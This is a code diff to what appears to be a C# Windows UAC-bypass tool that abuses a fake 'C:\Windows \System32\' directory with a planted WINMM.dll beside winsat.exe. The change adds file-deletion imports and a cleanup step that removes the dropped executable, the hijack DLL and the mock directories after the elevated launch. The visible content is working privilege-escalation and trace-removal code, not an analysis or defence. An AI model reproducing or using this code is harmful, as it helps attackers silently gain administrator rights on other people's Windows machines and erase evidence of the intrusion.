@@ -27,6 +27,11 @@ namespace MockDirUACBypass
         static extern bool CreateDirectory(string lpPathName, IntPtr lpSecurityAttributes);
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
         static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool RemoveDirectory(string lpPathName);
 
         [DllImport("shell32.dll", CharSet = CharSet.Auto)]
         static extern bool ShellExecuteEx(ref SHELLEXECUTEINFO lpExecInfo);
@@ -167,6 +172,12 @@ namespace MockDirUACBypass
             info.nShow = 5;
             info.fMask = 0x0000000c;
             ShellExecuteEx(ref info);
+
+            //Cleanup
+            DeleteFileW(@"C:\Windows \System32\winsat.exe");
+            DeleteFileW(@"C:\Windows \System32\WINMM.dll");
+            RemoveDirectory(@"C:\Windows \System32\");
+            RemoveDirectory(@"C:\Windows \");
 
             //Reenable filesystem redirection
             Wow64RevertWow64FsRedirection(wow64Value);
